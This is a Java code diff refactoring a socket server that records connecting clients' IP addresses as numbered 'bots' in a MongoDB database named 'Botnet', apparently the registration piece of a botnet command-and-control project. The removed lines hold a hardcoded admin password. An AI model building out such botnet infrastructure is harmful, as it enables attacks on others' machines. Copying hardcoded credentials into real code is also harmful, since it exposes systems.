@@ -9,10 +9,7 @@ package SServer_package;
  *
  * @author ligirk
  */
-import com.mongodb.MongoClient;
-import com.mongodb.MongoCredential;
-import com.mongodb.client.MongoCollection;
-import com.mongodb.client.MongoDatabase;
+import DBUtils.MongoConnect;
 import java.io.*;
 import java.net.*;
 import org.bson.Document;
@@ -29,27 +26,20 @@ public class SServer extends Thread {
     }
 
     public void run() {
-        MongoClient mongo = new MongoClient( "localhost" , 27017 ); 
-        MongoCredential credential;
-	credential = MongoCredential.createCredential("admin", "Botnet", "vinai123".toCharArray());
-        MongoDatabase database = mongo.getDatabase("Botnet");
-        Integer id = 1;
         
         try (ServerSocket serverSocket = new ServerSocket(port)) {
-
+            MongoConnect client = new MongoConnect();
+            client.Connect();
+            Integer id = client.Read("bot_ip").size() + 1;
             System.out.println("Server is listening on port " + port);
 
             while (true) {
                 Socket socket = serverSocket.accept();
-                System.out.println("New client connected");
-                
+//                System.out.println("New client connected");
                 InputStream input = socket.getInputStream();
                 BufferedReader reader = new BufferedReader(new InputStreamReader(input));
                 String ip = reader.readLine();
-                String bot_name = "bot" + id.toString();
-                MongoCollection<Document> collection = database.getCollection("bot_ip");
-                Document doc = new Document(bot_name, ip);
-                collection.insertOne(doc);
+                client.Write(ip, id);
                 id++;
             }
 
